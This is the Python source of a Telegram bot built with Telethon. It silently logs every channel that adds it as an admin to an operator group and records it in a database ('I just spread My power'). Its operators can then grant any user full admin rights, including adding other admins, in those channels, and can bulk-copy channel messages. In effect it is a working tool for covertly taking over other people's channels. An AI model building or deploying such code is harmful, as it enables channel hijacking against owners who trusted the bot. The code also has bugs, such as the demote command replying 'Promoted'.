from telethon import events
from telethon.tl.types import UpdateChannelParticipant
from config import bot, main_group_id, bot_id
import time
import database

@bot.on(events.Raw(UpdateChannelParticipant))
async def update(event):
    if event.user_id == bot_id:
        try:
            channel = await bot.get_entity(event.channel_id)
            await bot.send_message(-1001361915166, f"I just spread My power to {channel.title},  @{channel.username}")
            database.add_user(channel.username)
        except:
            await bot.send_message(main_group_id, f"I just spread My power to {channel.title}")


@bot.on(events.NewMessage(pattern="/start", chats=main_group_id))
async def _(event):
    await event.reply("Im Here")


@bot.on(events.NewMessage(pattern="/ping", chats=main_group_id))
async def _(event):
    await event.reply("Dont count me among the dead yet!!")


@bot.on(events.NewMessage(pattern="/spromote:", chats=main_group_id))
async def _(event):
    data = event.raw_text.split(":")
    user = await bot.get_entity(f"t.me/{data[1]}")
    chat = await bot.get_entity(f"t.me/{data[2]}")
    await bot.edit_admin(chat, user, change_info=True, post_messages=True, edit_messages=True, delete_messages=True, invite_users=True, manage_call=True, add_admins=True)
    await event.reply("Promoted")


@bot.on(events.NewMessage(pattern="/sdemote", chats=main_group_id))
async def _(event):
    data = event.raw_text.split(":")
    user = await bot.get_entity(f"t.me/{data[1]}")
    chat = await bot.get_entity(f"t.me/{data[2]}")
    await bot.edit_admin(chat, user, change_info=False, post_messages=False, edit_messages=False, delete_messages=False, invite_users=False, manage_call=False, add_admins=False)
    await event.reply("Promoted")


@bot.on(events.NewMessage(pattern=("/fwd")))
async def fwd_function(event):
    try:
        split = event.raw_text.split(":")
        username_of_channel = split[1]
        start_id = int(split[2])
        end_id = int(split[3])+1
        channel = await bot.get_entity(f"t.me/{username_of_channel}")
        for i in range(start_id, end_id):
            try:
                message = await bot.get_messages(channel, ids=i)
                await bot.send_message(event.chat_id, message)
            except:
                pass
            time.sleep(0.25)
    except:
        pass

    time.sleep(1)
    await event.delete()


@bot.on(events.NewMessage(pattern=("/edit")))
async def edit_function(event):
    split = event.raw_text.split(":")
    username = split[1]
    msg_id = int(split[2])
    reply = await event.get_reply_message()
    entity = await bot.get_entity(f"t.me/{username}")
    message = await bot.get_messages(entity, ids=msg_id)
    await event.edit("Editing the message holup....")
    await bot.edit_message(reply, file=message.media, force_document=True)
    await event.delete()


@bot.on(events.NewMessage(pattern=("/sort")))
async def sort(event):
    split = event.raw_text.split(":")
    files = []
    for i in range(int(split[1]),int(split[2])+1):
        try:
            x = await bot.get_messages(event.chat_id, ids=i)
            files.append(f"{x.media.document.attributes[0].file_name}:{x.id}")
        except:
            pass
    files.sort()
    for shit in files:
        split = shit.split(":")
        x = await bot.get_messages(event.chat_id, ids=int(split[1]))
        await bot.send_message(event.chat_id, x)
        time.sleep(0.25)


@bot.on(events.NewMessage(pattern=("/power")))
async def power(event):
    channels = database.search()
    string = ""
    for i in channels:
        string = f"{string}\n@{i[0]}"
    await bot.send_message(main_group_id, f"I have power over\n{string}")

@bot.on(events.NewMessage(pattern="/help", chats=main_group_id))
async def help(event):
    await event.reply("`/start` and `/ping` Just to confirm\n`/spromote:<user>:<channel>`\n`/sdemote:<user>:<channel>`\n`/fwd`, `/edit` and `/sort' same as userbot\n`/power` check total channels bot has power in")


bot.start()

bot.run_until_disconnected()
